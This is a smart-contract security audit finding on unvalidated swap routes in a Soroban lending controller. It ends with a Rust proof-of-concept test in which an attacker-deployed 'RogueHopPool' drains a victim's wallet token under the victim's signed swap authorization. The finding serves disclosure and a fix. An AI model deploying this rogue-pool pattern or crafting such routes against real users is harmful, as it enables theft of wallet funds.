### Title
Unvalidated swap route executes arbitrary pool/venue code inside the caller's authorization tree, enabling theft of unrelated wallet funds - (File: contracts/controller/src/strategies/swap.rs)

### Summary
The analog to the Synapse arbitrary-`callData` flaw: the controller's swap strategies accept fully opaque, user-supplied route bytes (`StrategySwap`) and forward them to the swap aggregator, which dispatches calls to whatever pool/venue addresses the payload names — with no allowlist. Any contract the route names runs on the call stack below the caller's signed authorization. A malicious route can therefore include a hop through an attacker-deployed "pool" that calls `token.transfer(victim, attacker, amount)` on any token the victim holds; Soroban simulation records that transfer as a child of the victim's `swap_collateral`/`multiply`/etc. auth entry, and if the victim signs that tree, the transfer executes — stealing wallet funds that were never part of the routed amount.

### Finding Description
In `swap_tokens`, the controller forwards the caller's `swap: &StrategySwap` bytes untouched to `router.execute_strategy(&controller, &amount_in, swap)` after authorizing only the input token transfer. It then enforces `RouterOverspend` on input and `NoSwapOutput` on output — both measured on the controller's own balances [1](#0-0) . None of these checks constrain which contracts the route invokes or what the caller's auth tree contains.

The router payload (`StrategyPayload.assets` + packed `ops`) names the pool/venue addresses directly and the router keeps no allowlist of them; the threat model explicitly acknowledges that "a route can put third-party code on the call stack below the caller's authorization" and that "neither the payload minimum nor the final risk gate bounds" the resulting wallet loss [2](#0-1) .

The repository's own harness proves the mechanics: `UnlistedPoolRouter` invokes whatever `hop_pool` the payload names, and `RogueHopPool::swap` performs `token.transfer(victim, attacker, WALLET_BALANCE)` on an unrelated token. In recording mode the stolen transfer is recorded as a child of Alice's `swap_collateral` entry, the call succeeds, a fair output is credited, and Alice's entire wallet balance moves to the attacker [3](#0-2) [4](#0-3) .

### Impact Explanation
Theft of user funds. A victim executing `multiply`, `swap_debt`, `swap_collateral`, or `repay_debt_with_collateral` with an attacker-crafted route (e.g., from a malicious quote source or a tampered frontend) can lose arbitrary tokens from their wallet — any token, any amount, not bounded by the routed input — because the rogue transfer executes under the victim's own signed auth tree. The swap itself can still deliver a fair output and the position can still pass the final health-factor gate, so nothing on-chain signals the theft.

### Likelihood Explanation
Medium. The theft requires the victim to sign an authorization tree containing the extra child transfer, and an honest client that decodes the route and inspects the auth tree would refuse it (the threat model prescribes this client-side mitigation). But, exactly like the Synapse case, the system relies on off-chain correctness: the controller and router place no on-chain constraint on which contracts a route may call, and wallet/simulation UIs commonly render nested auth poorly. A single compromised or buggy route source turns every signed swap-strategy transaction into a wallet drain.

### Recommendation
Constrain routes on-chain rather than trusting the payload: maintain an allowlist of callable venue/pool addresses in the router (or accept only a fixed venue-interface dispatch where pool identities are protocol-registered), and/or have the controller reject any `StrategySwap` whose execution would add children beyond the single authorized input transfer to the caller's auth tree. At minimum, document that clients must simulate and verify the auth tree contains exactly one input `transfer` before signing.

### Proof of Concept
`tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs` is a working PoC:

1. Deploy `RogueHopPool` initialized with `(victim=Alice, wallet_token, to=attacker, amount=WALLET_BALANCE)`.
2. Craft a `swap_collateral` route whose payload names the rogue pool as a hop, with `token_in = USDC`, `token_out = ETH`, `min_out` = fair output.
3. Alice invokes `controller.swap_collateral(alice, account_id, usdc_key, 50_000_000_000, eth_key, route)`. Simulation (recording mode) records the rogue pool's `token.transfer(Alice, attacker, WALLET_BALANCE)` as a child of Alice's `swap_collateral` authorization.
4. Alice signs the recorded tree. The transaction succeeds: `transfer` executes, `assert_eq!(s.wallet(&s.alice), 0)`, `s.wallet(&s.attacker) == WALLET_BALANCE`, and Alice even receives the correct ETH supply balance — the swap looks perfectly normal [4](#0-3) .

    pub fn execute_strategy(env: Env, sender: Address, total_in: i128, swap_xdr: Bytes) -> i128 {
        sender.require_auth();
        let route = RoutedSwap::from_xdr(&env, &swap_xdr).expect("route must decode");
        let router = env.current_contract_address();
        token::Client::new(&env, &route.token_in).transfer(&sender, &router, &total_in);
        let _: Val = env.invoke_contract(&route.hop_pool, &symbol_short!("swap"), vec![&env]);
        token::Client::new(&env, &route.token_out).transfer(&router, &sender, &route.min_out);
        route.min_out
    }
}

/// Attacker-deployed "pool". `amount == 0` is the benign control.
#[contract]
pub struct RogueHopPool;

#[contractimpl]
impl RogueHopPool {
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
    }
}

#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}
